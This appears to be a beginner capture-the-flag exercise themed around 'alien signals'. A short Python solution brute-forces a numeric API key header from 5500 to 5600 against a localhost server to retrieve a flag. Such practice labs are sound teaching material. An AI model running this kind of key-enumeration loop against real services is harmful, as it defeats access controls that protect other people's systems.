# Briefing: Unlocking the Message
# Agent, we're using a simple web API to listen for the alien signals, but we need to find a way to get past a numerical API key that's required to get a response. See if you can manage it.

# Some instructions:
'''
We're listening at http://127.0.0.1:8082
You need to perform a HTTP GET request with the correct x-api-key header.
We have narrowed down the key to be in the range of 5500 to 5600
Tip: Write a script which runs each possible combination until you get a response to get the flag.
'''

# -----------------------------------------------------------------------------------------------------

# Alien Signal API listening on http://127.0.0.1:8082
# Use HTTP GET with x-api-key header to get signal
# We have narrowed down the key to be in the range of 5500 to 5600
# Note: The script can timeout if this occurs try narrowing
# down your search
#

# -----------------------------------------------------------------------------------------------
# Alien Signal API listening on http://127.0.0.1:8082
# Use HTTP GET with x-api-key header to get signal
# We have narrowed down the key to be in the range of 5500 to 5600
# Note: The script can timeout if this occurs try narrowing
# down your search
#


import urllib.parse
import urllib.request

url = "http://127.0.0.1:8082"
startingKey = 5500
endingKey = 5600
hdr = {}

while startingKey <= endingKey:
    hdr = { 'x-api-key' : str(startingKey) }
    req = urllib.request.Request(url, headers=hdr)
    response = urllib.request.urlopen(req)
    print(response.read())
    startingKey = startingKey + 1
